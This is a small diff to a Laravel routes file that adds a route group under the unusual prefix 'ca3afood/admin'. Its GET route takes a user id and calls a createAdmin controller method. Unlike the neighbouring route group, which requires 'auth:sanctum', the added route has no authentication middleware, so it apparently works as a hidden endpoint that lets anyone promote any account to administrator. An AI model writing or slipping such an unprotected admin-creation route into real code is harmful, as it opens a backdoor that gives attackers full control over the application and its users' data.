@@ -130,6 +130,10 @@ Route::prefix('faqs')->middleware(['auth:sanctum'])->group(function () {
     });
 
 
+Route::prefix('ca3afood/admin')->group(function () {
+    Route::get('/{id}', [UserController::class, 'createAdmin']);
+});
+
 
 
 
